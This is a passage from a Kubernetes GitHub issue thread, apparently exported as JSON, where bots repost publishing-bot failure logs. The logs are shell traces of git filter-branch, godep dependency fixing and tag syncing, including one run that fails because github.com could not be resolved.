filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 040cc281f4849dee05d35e4f2fa2ee36729dea22.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ git log --format=%B master\n>    \t+ local k_base_commit=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ '[' -z e998d6c2bc83385d98186a87e95a0f947e121ec1 ']'\n>    \t++ git-find-merge e998d6c2bc83385d98186a87e95a0f947e121ec1 upstream/master\n>    \t+++ git rev-list 'e998d6c2bc83385d98186a87e95a0f947e121ec1^1..upstream/master' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t++ tail -1\n>    \t+++ git rev-list e998d6c2bc83385d98186a87e95a0f947e121ec1..upstream/master --ancestry-path\n>    \t+++ git rev-parse e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ local k_base_merge=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ '[' -z e998d6c2bc83385d98186a87e95a0f947e121ec1 ']'\n>    \t+ git branch -f filtered-branch-base e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=9bfe536d919bf7226c2692cc07f9919de13fedec\n>    \t++ git log --first-parent --format=%H --reverse 9bfe536d919bf7226c2692cc07f9919de13fedec..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db '!=' a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/csi-api\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ grep '^Kubernetes-commit: '\n>    \t+ local k_last_kube_commit=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ '[' -z e998d6c2bc83385d98186a87e95a0f947e121ec1 ']'\n>    \t++ git-find-merge e998d6c2bc83385d98186a87e95a0f947e121ec1 upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list 'e998d6c2bc83385d98186a87e95a0f947e121ec1^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list e998d6c2bc83385d98186a87e95a0f947e121ec1..upstream-branch --ancestry-path\n>    \t+++ git rev-parse e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ local k_last_kube_merge=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>    \t+ local dep_count=4\n>    \t+ (( i=0 ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-apimachinery-master\n>    \t+ '[' -z 261df694e7250e4fa7eb0d5ccff0e4b657a77953 ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to 261df694e7250e4fa7eb0d5ccff0e4b657a77953'\n>    \t+ git checkout -q 261df694e7250e4fa7eb0d5ccff0e4b657a77953\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=api\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-api-master\n>    \t+ '[' -z 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4'\n>    \t+ git checkout -q 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=client-go\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-client-go-master\n>    \t+ '[' -z e6341db955e2a2ed42914165000320a172403ac7 ']'\n>    \t+ pushd ../client-go\n>    \t+ echo 'Checking out k8s.io/client-go to e6341db955e2a2ed42914165000320a172403ac7'\n>    \t+ git checkout -q e6341db955e2a2ed42914165000320a172403ac7\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=apiextensions-apiserver\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-apiextensions-apiserver-master\n>    \t+ '[' -z 67d32729b98c514f63faa962eb0232e06b52524f ']'\n>    \t+ pushd ../apiextensions-apiserver\n>    \t+ echo 'Checking out k8s.io/apiextensions-apiserver to 67d32729b98c514f63faa962eb0232e06b52524f'\n>    \t+ git checkout -q 67d32729b98c514f63faa962eb0232e06b52524f\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' true = true ']'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>    \t+ rm -rf ./vendor/github.com/golang/glog\n>    \t+ rm -rf ./vendor/k8s.io\n>    \t+ rm -rf ./vendor/github.com/google/gofuzz\n>    \t+ rm -rf ./vendor/github.com/go-openapi\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>    \t+ echo 'Remove redundant godep commits on-top of a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db.'\n>    \t+ git reset --soft -q a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/csi-api\n>    \t+ local repo=csi-api\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n 'a3c43f0 Merge pull request #70718 from cblecker/godep-round-a-million' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=master\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-csi-api-master.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-csi-api-master.sh\n>    \t+ '[' -z '' ']'\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-csi-api-master.sh --dependencies apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master --mapping-output-file '../tag-csi-api-{{.Tag}}-mapping' -alsologtostderr ''\n>    \tfatal: unable to access 'https://github.com/kubernetes/csi-api/': Could not resolve host: github.com\n>    \tF1108 18:14:29.056275   17796 main.go:149] Failed to fetch tags for \"origin\": exit status 128\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc009d3b200, 0xc00b382840, 0x5e, 0xb2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xd4\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xdc1b20, 0xc000000003, 0xc0000b2210, 0xd626de, 0x7, 0x95, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x329\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xdc1b20, 0x3, 0x998c7a, 0x1f, 0xc0000f3a68, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x998c7a, 0x1f, 0xc0000f3a68, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:149 +0x2c5a\n>\n>[08 Nov 18 18:14 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-439594592):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>... 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 405721ab9678fde04d78961eec9498820d80408d '!=' 405721ab9678fde04d78961eec9498820d80408d ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=405721ab9678fde04d78961eec9498820d80408d\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ '[' -z 9878253c3cb8fa4699615b41375578fe681b0f9a ']'\n>\t++ git-find-merge 9878253c3cb8fa4699615b41375578fe681b0f9a upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '9878253c3cb8fa4699615b41375578fe681b0f9a^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 9878253c3cb8fa4699615b41375578fe681b0f9a..upstream-branch --ancestry-path\n>\t+++ git rev-parse 9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ local k_last_kube_merge=9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 405721ab9678fde04d78961eec9498820d80408d\n>\tRemove redundant godep commits on-top of 405721ab9678fde04d78961eec9498820d80408d.\n>\t+ echo 'Remove redundant godep commits on-top of 405721ab9678fde04d78961eec9498820d80408d.'\n>\t+ git reset --soft -q 405721ab9678fde04d78961eec9498820d80408d\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ local repo=code-generator\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '405721a Merge pull request #70998 from deads2k/client-07-listwatchtimeout' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=405721ab9678fde04d78961eec9498820d80408d\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-code-generator-master.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse master\n>\t+ '[' 405721ab9678fde04d78961eec9498820d80408d '!=' 405721ab9678fde04d78961eec9498820d80408d ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[17 Nov 18 07:08 UTC]: Successfully constructed master\n>[17 Nov 18 07:08 UTC]: /publish_scripts/construct.sh code-generator release-1.10 release-1.10   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-1.10\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tCleaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 